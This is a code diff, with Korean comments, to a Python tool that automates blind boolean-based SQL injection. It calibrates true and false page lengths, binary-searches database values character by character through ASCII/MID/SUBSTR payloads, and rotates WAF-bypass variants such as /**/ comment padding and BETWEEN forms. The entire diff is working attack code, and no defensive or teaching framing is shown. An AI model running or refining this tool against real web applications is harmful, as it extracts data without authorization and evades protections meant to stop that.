@@ -173,6 +173,7 @@ class T:
     def calibrate_boolean(self) -> bool:
         """TRUE/FALSE 기준 응답 길이 측정."""
         _, true_len, _ = self.inject(" AND 1=1-- -")
+        time.sleep(0.3)
         _, false_len, _ = self.inject(" AND 1=2-- -")
         if true_len == 0 or false_len == 0:
             return False
@@ -180,6 +181,14 @@ class T:
         if diff < 50:
             print(f"[BOOL] No length difference (diff={diff}B) — may not be boolean injectable")
             return False
+
+        # true가 false보다 커야 정상 (AND 1=1 → 정상 페이지 → 더 많은 컨텐츠)
+        # 반대면 논리 반전
+        if false_len > true_len:
+            print(f"[BOOL] WARNING: false({false_len}) > true({true_len}) — logic inverted!")
+            # 스왑
+            true_len, false_len = false_len, true_len
+
         self._true_len = true_len
         self._false_len = false_len
         self._margin = max(60, diff // 3)
@@ -187,7 +196,12 @@ class T:
         return True
 
     def is_true_response(self, length: int) -> bool:
-        return length > 0 and abs(length - self._true_len) < self._margin
+        if length <= 0:
+            return False
+        # true_len에 가까우면 True, false_len에 가까우면 False
+        dist_true  = abs(length - self._true_len)
+        dist_false = abs(length - self._false_len)
+        return dist_true < dist_false and dist_true < self._margin
 
     # ── Boolean 추출 (WAF 우회 자동 적용) ────────────────────────
     def bool_extract_len(self, expr: str, max_len: int = 40) -> int:
@@ -215,12 +229,24 @@ class T:
     def bool_extract_char(self, expr: str, pos: int) -> str:
         """Boolean 이진탐색으로 SQL 표현식의 pos번째 문자 추출."""
         lo, hi = 32, 126
-        # 우회 변형 생성
         char_exprs = [
             f"ASCII(MID(({expr}),{pos},1))",
             f"ORD(SUBSTR(({expr}),{pos},1))",
             f"ASCII(SUBSTRING(({expr}),{pos},1))",
         ]
+
+        # 먼저 해당 위치 문자가 존재하는지 확인 (0이면 빈 문자)
+        for ce in char_exprs:
+            for v in [f" AND {ce}>0-- -", f"/**/AND/**/{ce}>0-- -"]:
+                _, length, body = self.inject(v)
+                if self.is_waf_blocked(body, length):
+                    continue
+                if not self.is_true_response(length):
+                    # ASCII > 0 이 False → 문자가 없음 (NULL or empty)
+                    return ""
+                break
+            break
+
         while lo <= hi:
             mid = (lo + hi) // 2
             found = False
@@ -229,6 +255,7 @@ class T:
                     f" AND {ce}>{mid}-- -",
                     f"/**/AND/**/{ce}>{mid}-- -",
                     f" AND ({ce})>{mid}-- -",
+                    f" AND {ce} BETWEEN {mid+1} AND 126-- -",
                 ]
                 for v in variants:
                     _, length, body = self.inject(v)
@@ -243,9 +270,15 @@ class T:
                 if found:
                     break
             if not found:
-                lo = mid + 1
+                # 모든 변형이 WAF 차단 → 이진탐색 불가, 타임기반 전환
+                return "?"
             time.sleep(0.05)
-        return chr(lo) if 32 <= lo <= 126 else "?"
+
+        result_chr = lo
+        # 유효 ASCII 범위 벗어나면 재검증
+        if result_chr < 32 or result_chr > 126:
+            return "?"
+        return chr(result_chr)
 
     def bool_extract_string(self, expr: str, max_len: int = 40) -> str:
         """Boolean으로 SQL 문자열 표현식 전체 추출."""
